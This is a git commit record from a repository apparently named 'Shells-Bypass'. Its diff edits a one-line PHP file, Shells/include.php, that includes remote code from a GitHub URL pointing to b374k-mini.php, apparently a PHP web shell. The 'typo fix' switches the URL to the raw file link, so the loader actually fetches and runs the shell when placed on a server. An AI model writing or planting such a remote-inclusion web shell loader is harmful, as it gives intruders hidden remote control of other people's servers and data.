0be6415ae86c1de469c09bbfd6a24ceed0355280
alita-ido <alitaido06@gmail.com>
2020-08-11 16:12:20 +0800

    Fixed typo

--- Shells/include.php
+++ Shells/include.php
@@ -1,1 +1,1 @@
-<?php include('https://github.com/alita-ido/Shells-Bypass/blob/master/Shells/b374k-mini.php');?>
+<?php include('https://raw.githubusercontent.com/alita-ido/Shell-Bypass/master/Shells/b374k-mini.php');?>
